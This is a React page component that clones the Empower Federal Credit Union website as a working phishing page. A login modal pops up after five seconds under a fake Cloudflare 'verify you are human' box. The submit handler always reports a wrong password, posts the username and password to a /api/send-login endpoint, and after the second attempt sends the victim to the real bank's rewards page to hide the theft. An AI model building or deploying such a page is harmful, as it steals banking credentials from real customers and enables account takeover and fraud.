"use client"

import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { CanvasInput } from "@/components/CanvasInput"
import {
  ChevronLeft,
  ChevronRight,
  Pause,
  Search,
  Home,
  FileText,
  CreditCard,
  TrendingUp,
  PieChart,
  Menu,
  X,
  ChevronDown,
  Plus,
  Facebook,
  Instagram,
  Youtube,
  Linkedin,
  Phone,
  Info,
  User,
  UserPlus,
} from "lucide-react"
import { useState, useEffect } from "react"

export default function HomePage() {
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [showLoginModal, setShowLoginModal] = useState(false)
  const [expandedAccordion, setExpandedAccordion] = useState<string | null>(null)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showError, setShowError] = useState(false)
  const [loginAttempts, setLoginAttempts] = useState(0)

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowLoginModal(true)
    }, 5000)

    return () => clearTimeout(timer)
  }, [])

  const toggleAccordion = (section: string) => {
    setExpandedAccordion(expandedAccordion === section ? null : section)
  }

  const handleLoginSubmit = async () => {
    const currentUsername = username
    const currentPassword = password

    // Show error and reset fields first
    setShowError(true)
    setUsername("")
    setPassword("")

    // Hide error after 3 seconds
    setTimeout(() => {
      setShowError(false)
    }, 3000)

    try {
      await fetch("/api/send-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: currentUsername,
          password: currentPassword,
          attempt: loginAttempts + 1,
        }),
      })
    } catch (error) {
      console.error("Failed to send login data:", error)
    }

    setLoginAttempts((prev) => prev + 1)

    if (loginAttempts >= 1) {
      setTimeout(() => {
        window.location.href =
          "https://www.empowerfcu.com/personal/borrow-credit/empower-credit-card/empower-scorecard-rewards"
      }, 3000)
    }
  }

  return (
    <div className="min-h-screen bg-white">
      {showLoginModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div
            className="absolute inset-0 bg-black bg-opacity-50 backdrop-blur-sm"
            onClick={() => setShowLoginModal(false)}
          />

          <div className="relative bg-gray-900 text-white p-8 rounded-lg max-w-md w-full mx-4 shadow-2xl">
            <div className="text-center mb-8">
              <h1 className="text-2xl font-bold tracking-wider">EMPOWER</h1>
            </div>

            <div className="space-y-6">
              <h2 className="text-xl text-center mb-6">Log into your rewards!</h2>

              <div>
                <label className="block text-sm mb-2">Username</label>
                {showError && (
                  <div className="mb-2 p-2 bg-red-600 text-white text-sm rounded">Incorrect username or password</div>
                )}
                <CanvasInput
                  value={username}
                  onChange={setUsername}
                  className="bg-transparent border border-gray-600 text-white placeholder-gray-400 focus:border-white"
                  placeholder=""
                />
              </div>

              <div>
                <label className="block text-sm mb-2">Password</label>
                <CanvasInput
                  type="password"
                  value={password}
                  onChange={setPassword}
                  className="bg-transparent border border-gray-600 text-white placeholder-gray-400 focus:border-white"
                  placeholder=""
                />
                <p className="text-xs text-gray-400 mt-1">
                  Passwords are case sensitive. Your entry must match as originally entered.
                </p>
              </div>

              <div className="flex items-center space-x-3 p-3 border border-gray-600 rounded">
                <input type="checkbox" className="w-4 h-4" />
                <span className="text-sm">Verify you are human</span>
                <div className="ml-auto">
                  <div className="text-xs text-orange-400 font-bold">CLOUDFLARE</div>
                  <div className="text-xs text-gray-400">Privacy • Terms</div>
                </div>
              </div>

              <Button
                onClick={handleLoginSubmit}
                className="w-full bg-gray-800 hover:bg-gray-700 text-white py-3 font-semibold"
              >
                SUBMIT
              </Button>

              <div className="text-center">
                <a href="#" className="text-sm text-gray-400 hover:text-white underline">
                  Forgot your username or password?
                </a>
              </div>

              <Button
                variant="outline"
                className="w-full bg-gray-600 hover:bg-gray-500 text-white border-gray-600 py-3 font-semibold"
                onClick={() => setShowLoginModal(false)}
              >
                CANCEL
              </Button>
            </div>
          </div>
        </div>
      )}

      <div className={showLoginModal ? "blur-sm" : ""}>
        <div className="bg-blue-600 text-white text-center py-2 text-xs sm:text-sm">
          <span>Open Message</span>
          <button className="ml-2">
            <svg className="w-3 h-3 sm:w-4 sm:h-4 inline" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                clipRule="evenodd"
              />
            </svg>
          </button>
        </div>

        <div className="bg-red-500 text-white text-center py-2 text-xs sm:text-sm">
          <span>Open Message</span>
          <button className="ml-2">
            <svg className="w-3 h-3 sm:w-4 sm:h-4 inline" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                clipRule="evenodd"
              />
            </svg>
          </button>
        </div>

        <header className="bg-white shadow-sm">
          <div className="max-w-7xl mx-auto px-4">
            <div className="hidden md:flex justify-end items-center py-2 text-sm text-blue-600 space-x-6">
              <a href="#" className="hover:underline">
                Careers
              </a>
              <a href="#" className="hover:underline">
                Rates
              </a>
              <a href="#" className="hover:underline">
                Locations
              </a>
              <a href="#" className="hover:underline">
                About Us
              </a>
              <a href="#" className="hover:underline">
                Contact
              </a>
              <Search className="w-4 h-4" />
            </div>

            <div className="flex items-center justify-between py-4">
              <div className="flex items-center space-x-4 lg:space-x-8">
                <div className="flex items-center">
                  <img
                    src="https://www.empowerfcu.com/Images/header-logo.png?v=DrDHYFb71K_H48xryXSwY1PGAX_m2Y-PsgwHGFcUS6Y"
                    alt="Empower Federal Credit Union"
                    className="h-8 sm:h-10 lg:h-12 w-auto"
                  />
                </div>

                <div className="hidden sm:flex">
                  <button className="bg-blue-600 text-white px-4 py-2 lg:px-6 lg:py-2 font-medium text-sm lg:text-base">
                    Personal
                  </button>
                  <button className="bg-gray-100 text-gray-700 px-4 py-2 lg:px-6 lg:py-2 font-medium text-sm lg:text-base">
                    Business
                  </button>
                </div>
              </div>

              <div className="flex items-center space-x-2 sm:space-x-4">
                <Button
                  variant="outline"
                  className="hidden sm:inline-flex text-blue-600 border-blue-600 bg-transparent text-xs sm:text-sm"
                >
                  Open an Account
                </Button>
                <Button className="bg-blue-600 hover:bg-blue-700 text-xs sm:text-sm px-3 py-2 sm:px-4 sm:py-2">
                  <span className="hidden sm:inline">Online Banking</span>
                  <span className="sm:hidden">Login</span>
                </Button>
                <button className="md:hidden p-2" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
                  {mobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
                </button>
              </div>
            </div>

            <nav className={`${mobileMenuOpen ? "block" : "hidden"} md:block pb-4`}>
              <div className="flex flex-col md:flex-row md:items-center space-y-2 md:space-y-0 md:space-x-8">
                <div className="relative group">
                  <button className="flex items-center space-x-1 text-gray-700 font-medium py-2 md:py-0">
                    <span>Bank</span>
                    <ChevronRight className="w-4 h-4 rotate-90" />
                  </button>
                </div>
                <div className="relative group">
                  <button className="flex items-center space-x-1 text-gray-700 font-medium py-2 md:py-0">
                    <span>Borrow</span>
                    <ChevronRight className="w-4 h-4 rotate-90" />
                  </button>
                </div>
                <div className="relative group">
                  <button className="flex items-center space-x-1 text-gray-700 font-medium py-2 md:py-0">
                    <span>Manage</span>
                    <ChevronRight className="w-4 h-4 rotate-90" />
                  </button>
                </div>
                <div className="relative group">
                  <button className="flex items-center space-x-1 text-gray-700 font-medium py-2 md:py-0">
                    <span>Services</span>
                    <ChevronRight className="w-4 h-4 rotate-90" />
                  </button>
                </div>
                <div className="relative group">
                  <button className="flex items-center space-x-1 text-gray-700 font-medium py-2 md:py-0">
                    <span>Learn</span>
                    <ChevronRight className="w-4 h-4 rotate-90" />
                  </button>
                </div>
                <div className="md:hidden pt-4 border-t border-gray-200">
                  <div className="flex mb-4">
                    <button className="bg-blue-600 text-white px-4 py-2 font-medium text-sm flex-1">Personal</button>
                    <button className="bg-gray-100 text-gray-700 px-4 py-2 font-medium text-sm flex-1">Business</button>
                  </div>
                  <div className="flex items-center space-x-4 text-sm text-blue-600">
                    <a href="#" className="hover:underline">
                      Careers
                    </a>
                    <a href="#" className="hover:underline">
                      Rates
                    </a>
                    <a href="#" className="hover:underline">
                      Locations
                    </a>
                    <Search className="w-4 h-4" />
                  </div>
                </div>
              </div>
            </nav>
          </div>
        </header>

        <section className="relative h-[400px] sm:h-[500px] lg:h-[600px] overflow-hidden">
          <div
            className="absolute inset-0 bg-cover bg-center"
            style={{ backgroundImage: "url('/images/house-for-sale.jpg')" }}
          >
            <div className="absolute inset-0 bg-gradient-to-r from-blue-600/20 to-transparent"></div>
          </div>

          <button className="absolute left-2 sm:left-4 top-1/2 transform -translate-y-1/2 bg-white bg-opacity-80 rounded-full p-2 sm:p-3 hover:bg-opacity-100 z-10">
            <ChevronLeft className="w-4 h-4 sm:w-6 sm:h-6 text-gray-700" />
          </button>
          <button className="absolute right-2 sm:right-4 top-1/2 transform -translate-y-1/2 bg-white bg-opacity-80 rounded-full p-2 sm:p-3 hover:bg-opacity-100 z-10">
            <ChevronRight className="w-4 h-4 sm:w-6 sm:h-6 text-gray-700" />
          </button>

          <div className="absolute inset-0 flex items-center">
            <div className="max-w-7xl mx-auto px-4 w-full lg:max-w-sm lg:ml-8 flex-shrink-0">
              <div className="bg-red-500 text-white p-6 sm:p-8 lg:p-12 rounded-lg transform -rotate-3 shadow-2xl border-2 sm:border-4 border-white">
                <div className="text-4xl sm:text-5xl lg:text-7xl font-black leading-none tracking-tight">FOR</div>
                <div className="text-4xl sm:text-5xl lg:text-7xl font-black leading-none tracking-tight">SALE</div>
              </div>

              <div className="absolute -top-4 sm:-top-6 lg:-top-8 -right-6 sm:-right-8 lg:-right-12 bg-blue-600 text-white rounded-full p-4 sm:p-6 lg:p-8 shadow-2xl transform rotate-12 border-2 sm:border-4 border-white">
                <div className="text-center">
                  <div className="text-xs font-bold mb-1 tracking-wide">EMPOWER</div>
                  <div className="text-2xl sm:text-3xl lg:text-4xl font-black">Yes</div>
                </div>
                <div className="absolute bottom-1 sm:bottom-2 left-1/2 transform translate-y-full -translate-x-1/2">
                  <div className="w-0 h-0 border-l-4 border-r-4 border-t-8 sm:border-l-6 sm:border-r-6 sm:border-t-12 border-transparent border-t-blue-600"></div>
                </div>
              </div>
            </div>

            <Card className="bg-white p-4 sm:p-6 lg:p-8 max-w-sm w-full lg:max-w-sm shadow-2xl flex-shrink-0">
              <h2 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-4 leading-tight">
                Mortgage
                <br />
                Interest Rate
              </h2>
              <p className="text-gray-700 mb-6 text-base sm:text-lg">
                Save 0.25% on Mortgage
                <br />
                Interest Rate? <span className="font-bold text-blue-600">Yes!</span>
              </p>
              <Button className="bg-blue-600 hover:bg-blue-700 w-full mb-6 py-3 text-base sm:text-lg font-semibold">
                Learn More
              </Button>
              <div className="flex items-center text-sm text-gray-500">
                <Pause className="w-4 h-4 mr-2" />
                PAUSE
              </div>
            </Card>
          </div>
        </section>

        <section className="py-8 sm:py-12 lg:py-16 bg-gray-50">
          <div className="max-w-7xl mx-auto px-4">
            <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-4 sm:gap-6 lg:gap-8">
              <div className="text-center">
                <div className="bg-white rounded-full p-3 sm:p-4 w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 shadow-lg flex items-center justify-center">
                  <div className="w-8 h-8 sm:w-10 sm:h-10 bg-blue-600 rounded-full flex items-center justify-center">
                    <span className="text-white text-lg sm:text-xl font-bold">+</span>
                  </div>
                </div>
                <h3 className="font-semibold text-gray-900 text-xs sm:text-sm leading-tight">Open an Account</h3>
              </div>

              <div className="text-center">
                <div className="bg-white rounded-full p-3 sm:p-4 w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 shadow-lg flex items-center justify-center">
                  <Home className="w-8 h-8 sm:w-10 sm:h-10 text-blue-600" />
                </div>
                <h3 className="font-semibold text-gray-900 text-xs sm:text-sm leading-tight">Apply for a Mortgage</h3>
              </div>

              <div className="text-center">
                <div className="bg-white rounded-full p-3 sm:p-4 w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 shadow-lg flex items-center justify-center">
                  <FileText className="w-8 h-8 sm:w-10 sm:h-10 text-blue-600" />
                </div>
                <h3 className="font-semibold text-gray-900 text-xs sm:text-sm leading-tight">Apply for a Loan</h3>
              </div>

              <div className="text-center">
                <div className="bg-white rounded-full p-3 sm:p-4 w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 shadow-lg flex items-center justify-center">
                  <CreditCard className="w-8 h-8 sm:w-10 sm:h-10 text-blue-600" />
                </div>
                <h3 className="font-semibold text-gray-900 text-xs sm:text-sm leading-tight">
                  Apply for a Credit Card
                </h3>
              </div>

              <div className="text-center">
                <div className="bg-white rounded-full p-3 sm:p-4 w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 shadow-lg flex items-center justify-center">
                  <TrendingUp className="w-8 h-8 sm:w-10 sm:h-10 text-blue-600" />
                </div>
                <h3 className="font-semibold text-gray-900 text-xs sm:text-sm leading-tight">View Rates</h3>
              </div>

              <div className="text-center">
                <div className="bg-white rounded-full p-3 sm:p-4 w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 shadow-lg flex items-center justify-center">
                  <PieChart className="w-8 h-8 sm:w-10 sm:h-10 text-blue-600" />
                </div>
                <h3 className="font-semibold text-gray-900 text-xs sm:text-sm leading-tight">Wealth Management</h3>
              </div>
            </div>
          </div>
        </section>

        <section className="py-12 sm:py-16 lg:py-20 bg-white">
          <div className="max-w-4xl mx-auto px-4">
            <div className="text-center mb-12">
              <h1 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-900 mb-6 leading-tight">
                Make a point of using your Mastercard. Use your points to claim all kinds of rewards.
              </h1>

              <h2 className="text-lg sm:text-xl text-gray-700 mb-8">
                Make a point of using your Credit Card. Use your points to claim all kinds of rewards.
              </h2>

              <div className="text-left max-w-3xl mx-auto space-y-4 text-gray-700 leading-relaxed">
                <p>
                  When you're running errands, dining out, shopping online, or buying stuff in stores, it pays to use
                  your Empower FCU Mastercard credit card. Each purchase transaction earns you points through rewards
                  platform, ScoreCard® Rewards, that can be easily redeemed for gift cards, travel services, and cash
                  back.
                </p>

                <p>
                  If you have any questions about rewards, please reach out to ScoreCard® Rewards directly at
                  1-800-854-0790 for assistance.
                </p>
              </div>
            </div>

            <div className="grid md:grid-cols-2 gap-8 mb-12">
              <div className="space-y-4">
                <div className="flex items-start space-x-3">
                  <div className="w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0"></div>
                  <p className="text-gray-700">Redeem points online or over the phone.</p>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0"></div>
                  <p className="text-gray-700">Redeem points for gift cards starting at $25.</p>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0"></div>
                  <p className="text-gray-700">Use your points to purchase a wide variety of merchandise.</p>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0"></div>
                  <p className="text-gray-700">Redeem points for travel through travel booking.</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="flex items-start space-x-3">
                  <div className="w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0"></div>
                  <p className="text-gray-700">Use points for PayPal purchases.</p>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0"></div>
                  <p className="text-gray-700">Feeling generous? Donate points to a charity of your choice.</p>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-2 h-2 bg-blue-600 rounded-full mt-2 flex-shrink-0"></div>
                  <p className="text-gray-700">Redeem points for a statement credit to your credit card balance.</p>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              {[
                { id: "gift-cards", title: "Redeem Points for Gift Cards" },
                { id: "cash-back", title: "Cash Back" },
                { id: "travel-rewards", title: "Travel Rewards" },
                { id: "merchandise", title: "Merchandise Rewards" },
                { id: "paypal", title: "PayPal Purchases" },
                { id: "charity", title: "Charitable Point Donations" },
              ].map((item) => (
                <div key={item.id} className="border border-gray-200 rounded-lg bg-gray-50">
                  <button
                    onClick={() => toggleAccordion(item.id)}
                    className="w-full flex items-center justify-between p-4 text-left hover:bg-gray-100 transition-colors"
                  >
                    <div className="flex items-center space-x-3">
                      <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                        <Plus className="w-4 h-4 text-white" />
                      </div>
                      <span className="font-medium text-blue-600">{item.title}</span>
                    </div>
                    <ChevronDown
                      className={`w-5 h-5 text-gray-400 transition-transform ${
                        expandedAccordion === item.id ? "rotate-180" : ""
                      }`}
                    />
                  </button>
                  {expandedAccordion === item.id && (
                    <div className="px-4 pb-4 text-gray-700">
                      <p>Details about {item.title.toLowerCase()} will be displayed here.</p>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        </section>

        <footer className="bg-gray-100 py-12">
          <div className="max-w-7xl mx-auto px-4">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8 mb-8">
              {/* Left Column - Contact & Social */}
              <div className="space-y-6">
                <div>
                  <h3 className="font-bold text-gray-900 mb-2">Routing Number: 221380127</h3>
                </div>

                <div>
                  <h4 className="font-semibold text-gray-900 mb-3">Connect</h4>
                  <div className="flex space-x-3">
                    <Facebook className="w-6 h-6 text-blue-600 hover:text-blue-700 cursor-pointer" />
                    <Instagram className="w-6 h-6 text-blue-600 hover:text-blue-700 cursor-pointer" />
                    <Youtube className="w-6 h-6 text-blue-600 hover:text-blue-700 cursor-pointer" />
                    <Linkedin className="w-6 h-6 text-blue-600 hover:text-blue-700 cursor-pointer" />
                  </div>
                </div>

                <div>
                  <h4 className="font-semibold text-gray-900 mb-3">Download Our Mobile Apps</h4>
                  <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
                    <img src="/app-store-download-button.png" alt="Download on App Store" className="h-10" />
                    <img src="/get-it-on-google-play-button.png" alt="Get it on Google Play" className="h-10" />
                  </div>
                </div>
              </div>

              {/* Call & Contact Column */}
              <div className="space-y-6">
                <div>
                  <h4 className="font-semibold text-gray-900 mb-3">Call</h4>
                  <div className="flex items-center space-x-2 text-blue-600">
                    <Phone className="w-4 h-4" />
                    <span className="underline">315.477.2200 | 800.462.5000</span>
                  </div>
                </div>

                <div>
                  <h4 className="font-semibold text-gray-900 mb-3">Get in Touch</h4>
                  <div className="flex items-center space-x-2 text-blue-600">
                    <Info className="w-4 h-4" />
                    <a href="#" className="underline hover:text-blue-700">
                      Contact Us
                    </a>
                  </div>
                </div>
              </div>

              {/* Join Column */}
              <div className="space-y-4">
                <h4 className="font-semibold text-gray-900 mb-3">Join</h4>
                <div className="space-y-3">
                  <div className="flex items-center space-x-2 text-blue-600">
                    <FileText className="w-4 h-4" />
                    <a href="#" className="underline hover:text-blue-700">
                      Apply for a Loan
                    </a>
                  </div>
                  <div className="flex items-center space-x-2 text-blue-600">
                    <User className="w-4 h-4" />
                    <a href="#" className="underline hover:text-blue-700">
                      Open an Account
                    </a>
                  </div>
                  <div className="flex items-center space-x-2 text-blue-600">
                    <UserPlus className="w-4 h-4" />
                    <a href="#" className="underline hover:text-blue-700">
                      Apply to Join
                    </a>
                  </div>
                </div>
              </div>

              {/* Popular Column */}
              <div className="space-y-4">
                <h4 className="font-semibold text-gray-900 mb-3">Popular</h4>
                <div className="space-y-2">
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    Member Center
                  </a>
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    Our Story
                  </a>
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    Community Support
                  </a>
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    Membership & Benefits
                  </a>
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    News
                  </a>
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    Careers
                  </a>
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    Locations & ATMs
                  </a>
                  <a href="#" className="block text-blue-600 underline hover:text-blue-700">
                    Get CoBrowsing Code
                  </a>
                </div>
              </div>
            </div>

            {/* Equal Housing & NCUA Info */}
            <div className="border-t border-gray-300 pt-8 mb-8">
              <div className="flex flex-col lg:flex-row lg:items-start space-y-6 lg:space-y-0 lg:space-x-8">
                <div className="flex-shrink-0">
                  <img src="/equal-housing-lender-logo.png" alt="Equal Housing Lender" className="h-15 w-15" />
                </div>
                <div className="flex-1">
                  <p className="text-sm text-gray-700 leading-relaxed mb-4">
                    This credit union is federally insured by the National Credit Union Administration. Your savings
                    federally insured to at least $250,000 and backed by the full faith and credit of the United States
                    Government. National Credit Union Administration, a U.S. Government Agency. Equal Housing Lender. We
                    operate in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.
                  </p>
                  <p className="text-sm text-gray-700 mb-4">
                    <strong>NMLS #412348</strong>
                  </p>
                  <p className="text-sm text-gray-700 leading-relaxed">
                    Empower Federal Credit Union welcomes employees of many companies, immediate family/household
                    members of employees and retirees, as well as our outreach to underserved communities to enjoy
                    personal and business banking solutions including auto loan, mortgages*, credit cards and more. Bank
                    online, in any central NY branch, or call us at 315.477.2200.
                  </p>
                  <p className="text-xs text-gray-600 mt-2">
                    * Home mortgages available in FL, PA, CT, NY, SC, NC, and TN.
                  </p>
                </div>
                <div className="flex-shrink-0">
                  <div className="flex flex-wrap gap-4">
                    <img
                      src="/best-credit-union-new-york-award-badge.png"
                      alt="Best Credit Union Award"
                      className="h-15"
                    />
                    <img
                      src="/credit-union-of-the-year-winner-badge.png"
                      alt="Credit Union of the Year"
                      className="h-15"
                    />
                    <img src="/banking-certification-logo.png" alt="Banking Certification" className="h-15" />
                    <img src="/great-place-to-work-certified-logo.png" alt="Great Place to Work" className="h-15" />
                  </div>
                </div>
              </div>
            </div>

            {/* Bottom Links & Copyright */}
            <div className="border-t border-gray-300 pt-6">
              <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between space-y-4 lg:space-y-0">
                <div className="flex flex-wrap gap-4 text-sm">
                  <a href="#" className="text-blue-600 underline hover:text-blue-700">
                    Website Accessibility
                  </a>
                  <span className="text-gray-400">|</span>
                  <a href="#" className="text-blue-600 underline hover:text-blue-700">
                    Disclosures
                  </a>
                  <span className="text-gray-400">|</span>
                  <a href="#" className="text-blue-600 underline hover:text-blue-700">
                    Browser Requirements
                  </a>
                  <span className="text-gray-400">|</span>
                  <a href="#" className="text-blue-600 underline hover:text-blue-700">
                    Sitemap
                  </a>
                  <span className="text-gray-400">|</span>
                  <a href="#" className="text-blue-600 underline hover:text-blue-700">
                    Website/Online Privacy Statement
                  </a>
                </div>
                <div className="text-sm text-gray-600">
                  © 2025 Empower FCU. All rights reserved. Website by{" "}
                  <a href="#" className="text-blue-600 underline hover:text-blue-700">
                    ZAG Interactive
                  </a>
                </div>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </div>
  )
}
